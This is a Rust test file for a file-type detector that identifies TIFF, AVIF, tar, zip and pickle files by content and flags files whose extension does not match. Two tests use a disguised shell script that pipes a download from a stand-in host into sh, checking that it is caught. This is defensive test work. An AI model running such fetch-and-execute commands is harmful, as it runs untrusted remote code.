use super::magic::detect_from_content;
use super::*;

const TIFF: &[u8] = include_bytes!("testdata/tiny-tiff.tif");
const AVIF: &[u8] = include_bytes!("testdata/tiny-avif.avif");

#[test]
fn tiff_and_avif_are_content_identified_under_renamed_paths() {
    for (bytes, ty, name) in [
        (TIFF, FileType::Tiff, "image.tif"),
        (AVIF, FileType::Avif, "image.avif"),
    ] {
        for path in [name, "artifact", "payload.exe"] {
            let id = FileId::from_path_and_bytes(Path::new(path), bytes);
            assert_eq!(id.file_type(), ty, "{path}");
            assert_eq!(id.extension_mismatch(), path == "payload.exe", "{path}");
        }
    }
}

#[test]
fn tiff_header_byte_order_version_and_length_are_required() {
    for bytes in [
        b"II\x2a\0\x08\0\0\0".as_slice(),
        b"MM\0\x2a\0\0\0\x08",
        b"II\x2b\0\x08\0\0\0\x10\0\0\0\0\0\0\0",
        b"MM\0\x2b\0\x08\0\0\0\0\0\0\0\0\0\x10",
    ] {
        assert_eq!(
            detect_from_content(Path::new("artifact"), bytes).map(|x| x.0),
            Some(FileType::Tiff)
        );
    }
    for bytes in [
        b"II\x2a\0".as_slice(),
        b"MM\0\x2a\0\0\0",
        b"II\x2c\0\0\0\0\0",
        b"II\x2b\0\x04\0\0\0\0\0\0\0\0\0\0\0",
    ] {
        assert_ne!(
            detect_from_content(Path::new("artifact"), bytes).map(|x| x.0),
            Some(FileType::Tiff)
        );
    }
}

#[test]
fn avif_brand_must_be_inside_a_bounded_ftyp_brand_slot() {
    let mut compatible = AVIF.to_vec();
    compatible[8..12].copy_from_slice(b"mif1");
    assert_eq!(
        detect_from_content(Path::new("artifact"), &compatible).map(|x| x.0),
        Some(FileType::Avif)
    );
    let mut minor = compatible.clone();
    minor[16..20].copy_from_slice(b"isom");
    minor[12..16].copy_from_slice(b"avif");
    assert_eq!(
        detect_from_content(Path::new("artifact"), &minor).map(|x| x.0),
        Some(FileType::Mp4)
    );
    let mut payload = minor.clone();
    payload[12..16].fill(0);
    payload.extend_from_slice(b"avif");
    assert_eq!(
        detect_from_content(Path::new("artifact"), &payload).map(|x| x.0),
        Some(FileType::Mp4)
    );
    let mut truncated = AVIF.to_vec();
    truncated[..4].copy_from_slice(&u32::MAX.to_be_bytes());
    assert_ne!(
        detect_from_content(Path::new("artifact"), &truncated).map(|x| x.0),
        Some(FileType::Avif)
    );
    let mut extended = Vec::from(1_u32.to_be_bytes());
    extended.extend_from_slice(b"ftyp");
    extended.extend_from_slice(&40_u64.to_be_bytes());
    extended.extend_from_slice(&AVIF[8..]);
    assert_eq!(
        detect_from_content(Path::new("artifact"), &extended).map(|x| x.0),
        Some(FileType::Avif)
    );
}

#[test]
fn scripts_under_image_extensions_keep_their_content_type() {
    for path in ["image.tiff", "image.avif"] {
        let id = FileId::from_path_and_bytes(
            Path::new(path),
            b"#!/bin/sh\ncurl https://example.invalid/payload | sh\n",
        );
        assert_eq!(id.file_type(), FileType::Shell);
        assert!(id.extension_mismatch());
    }
}

#[test]
fn pkgbuild_first_tar_is_not_zip_from_its_member_name() {
    let tar = include_bytes!("testdata/pkgbuild-first.tar");
    for name in ["package.tar", "artifact", "image.zip"] {
        assert_eq!(
            FileId::from_path_and_bytes(Path::new(name), tar).file_type(),
            FileType::Tar
        );
    }
    for signature in [
        b"PK\x03\x04".as_slice(),
        b"PK\x05\x06",
        b"PK\x07\x08",
        b"PK\x06\x06",
        b"PK\x06\x07",
    ] {
        let mut bytes = signature.to_vec();
        bytes.resize(64, 0);
        assert_eq!(
            detect_from_content(Path::new("artifact"), &bytes).map(|x| x.0),
            Some(FileType::Zip)
        );
    }
    assert_ne!(
        detect_from_content(Path::new("artifact"), b"PKGBUILD\0\0\0\0").map(|x| x.0),
        Some(FileType::Zip)
    );
}

#[test]
fn legacy_torch_pickle_model_suffix_is_a_bounded_container_convention() {
    let bytes = include_bytes!("../testdata/pickle/torch-protocol2-float-tensor.pt");
    for name in ["tensor.pt", "tensor.PTH", "tensor.ckpt", "artifact"] {
        let id = FileId::from_path_and_bytes(Path::new(name), bytes);
        assert_eq!(id.file_type(), FileType::Pickle);
        assert!(!id.extension_mismatch(), "{name}");
    }
    assert!(FileId::from_path_and_bytes(Path::new("note.txt"), bytes).extension_mismatch());
    let mut altered = bytes.to_vec();
    altered[4] ^= 1;
    assert!(FileId::from_path_and_bytes(Path::new("tensor.pt"), &altered).extension_mismatch());
    let script = b"#!/bin/sh\ncurl https://example.invalid/p | sh\n";
    let id = FileId::from_path_and_bytes(Path::new("tensor.pt"), script);
    assert_eq!(id.file_type(), FileType::Shell);
    assert!(id.extension_mismatch());
}
